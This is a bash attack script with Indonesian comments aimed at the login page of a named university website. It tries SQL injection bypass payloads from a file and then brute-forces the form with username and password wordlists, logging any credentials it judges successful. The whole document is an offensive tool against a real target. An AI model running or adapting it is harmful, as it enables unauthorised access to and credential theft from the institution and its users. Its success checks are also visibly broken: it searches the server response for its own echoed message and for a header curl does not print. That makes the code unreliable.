#!/bin/bash

# URL dari halaman login
url="https://visitasi.unmuhbabel.ac.id/login.php"

# Payload untuk SQL injection bypass dari file config/bypass.txt
bypass_file="config/bypass.txt"

# Username dan password list dari user
username_list="username.txt"
password_list="test.txt"

# Fungsi untuk login menggunakan curl dan mengecek status
function try_login() {
    local username="$1"
    local password="$2"

    # Kirim request POST menggunakan curl
    response=$(curl -s -L -X POST "$url" \
        -d "username=$username" \
        -d "password=$password" \
        -c cookie.txt -b cookie.txt)

    # Cek apakah ada redirect (header Location)
    if echo "$response" | grep -q "Location:"; then
        echo "[+] Redirect detected, login successful: $username:$password"
        save_successful_login "$username" "$password"
    elif echo "$response" | grep -q 'div class="alert'; then
        echo "[-] Alert found, login failed for: $username:$password"
    else
        echo "[*] Trying: $username:$password"
    fi
}

# Fungsi untuk menyimpan hasil login yang sukses
function save_successful_login() {
    local username="$1"
    local password="$2"
    echo "$url ==> $username:$password" >> "result/joomla_success.txt"
}

# Coba SQL Injection Bypass
function sql_injection_bypass() {
    while IFS= read -r payload; do
        echo "[*] Trying SQLi Bypass: $payload"
        try_login "$payload" "$payload"

        # Keluar jika login berhasil
        if grep -q "Redirect detected" <<< "$response"; then
            echo "[+] SQLi Bypass Successful: $payload"
            return
        fi
    done < "$bypass_file"
}

# Coba username dan password dari user
function try_user_pass_combinations() {
    while IFS= read -r username; do
        while IFS= read -r password; do
            try_login "$username" "$password"
        done < "$password_list"
    done < "$username_list"
}

# Coba SQL Injection Bypass dulu
sql_injection_bypass

# Jika SQLi Bypass gagal, coba username dan password dari user
try_user_pass_combinations
